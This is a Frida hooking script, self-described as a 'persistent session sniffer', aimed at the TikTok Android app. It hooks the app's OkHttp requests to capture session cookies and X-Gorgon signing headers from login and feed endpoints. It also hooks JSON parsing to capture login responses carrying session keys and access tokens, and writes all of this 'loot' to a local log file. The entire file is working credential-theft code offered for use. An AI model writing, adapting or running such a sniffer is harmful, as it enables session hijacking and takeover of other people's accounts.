/*
 * DUDE's Persistent Session Sniffer
 *
 * Hooks network requests to harvest:
 * 1. Cookies (sessionid, odin_tt, etc.)
 * 2. Signing Headers (X-Gorgon, X-Khronos)
 * 3. Login Credentials (if plaintext in POST)
 *
 * All loot is written to /data/local/tmp/tiktok_loot.log
 */

console.log("[*] DUDE: Persistent Sniffer Active. Harvesting to /data/local/tmp/tiktok_loot.log");

Java.perform(function () {
    var File = Java.use("java.io.File");
    var FileOutputStream = Java.use("java.io.FileOutputStream");
    var logFile = "/data/local/tmp/tiktok_loot.log";

    function logToFile(data) {
        try {
            var fos = FileOutputStream.$new(logFile, true);
            fos.write(Java.use("java.lang.String").$new(data + "\n").getBytes());
            fos.close();
        } catch (e) {
            console.log("[-] Log failed: " + e.message);
        }
    }

    // Hook OkHttp3 for network interception
    try {
        var Request = Java.use("okhttp3.Request");
        Request.headers.overload().implementation = function () {
            var headers = this.headers();
            var urlObj = this.url();
            if (!urlObj) return headers;
            var url = urlObj.toString();
            
            // Only log interesting endpoints (Login, User Info, Feed)
            if (url.indexOf("/aweme/v") !== -1 || url.indexOf("/passport/") !== -1) {
                var cookies = headers.get("Cookie");
                var gorgon = headers.get("X-Gorgon");
                var timestamp = new Date().toISOString();
                
                var loot = "[" + timestamp + "] URL: " + url;
                if (cookies) loot += "\n   [COOKIE] " + cookies;
                if (gorgon) loot += "\n   [GORGON] " + gorgon;
                
                console.log("[LOOT] Captured data from " + url);
                logToFile(loot);
            }
            return headers;
        };
    } catch (e) {
        console.log("[-] OkHttp3 hook failed: " + e.message);
    }

    // Hook JSON parsing for potential credential theft in login responses
    try {
        var JSONObject = Java.use("org.json.JSONObject");
        JSONObject.$init.overload("java.lang.String").implementation = function (json) {
            if (json && (json.indexOf("session_key") !== -1 || json.indexOf("access_token") !== -1)) {
                logToFile("[LOGIN_RESPONSE] " + json);
                console.log("[LOOT] Captured Login JSON!");
            }
            return this.$init(json);
        };
    } catch (e) {}

});
